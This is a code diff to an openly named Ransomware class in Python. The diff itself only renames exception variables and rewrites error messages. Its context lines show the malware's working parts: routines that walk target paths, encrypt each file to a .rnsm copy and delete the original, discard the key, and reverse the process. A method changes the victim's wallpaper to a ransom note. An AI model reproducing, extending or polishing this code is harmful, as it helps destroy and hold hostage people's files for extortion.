@@ -109,8 +109,8 @@ class Ransomware:
                     encrypted_file.write(encrypted_data)
                 # Lastly, remove the original file.
                 os.remove(filepath)
-        except Exception as e:
-            print(f"Error during file encryption: {e}")
+        except Exception as err:
+            print("encrypt_file(): Error --> ", err)
 
     def start_encryption(self):
         for location in target_paths:
@@ -123,8 +123,8 @@ class Ransomware:
                             filepath = os.path.join(path, name)
                             self.encrypt_file(filepath)
                             print(f"Encrypted: {filepath}  -->  {filepath}.rnsm")
-            except Exception as e:
-                print(f"Error during file encryption loop: {e}")
+            except Exception as err:
+                print("start_encryption(): Error --> ", err)
             self.encryption_key = None
             self.box = None
 
@@ -143,8 +143,8 @@ class Ransomware:
                     original_file.write(original_data)
                 # Lastly, remove the encrypted file.
                 os.remove(f"{filepath}.rnsm")
-        except Exception as e:
-            print(f"Error during file encryption: {e}")
+        except Exception as err:
+            print("decrypt_file(): Error --> ", err)
 
     def start_decryption(self):
         for location in target_paths:
@@ -157,8 +157,8 @@ class Ransomware:
                             filepath = os.path.join(path, name)
                             self.decrypt_file(filepath)
                             print(f"Decrypted: {filepath}.rnsm  -->  {filepath}")
-            except Exception as e:
-                print(f"Error during file decryption loop: {e}")
+            except Exception as err:
+                print("start_decryption(): Error --> ", err)
 
     def change_wallpaper(self):
         "Change the victim's wallpaper to display our ransom note"
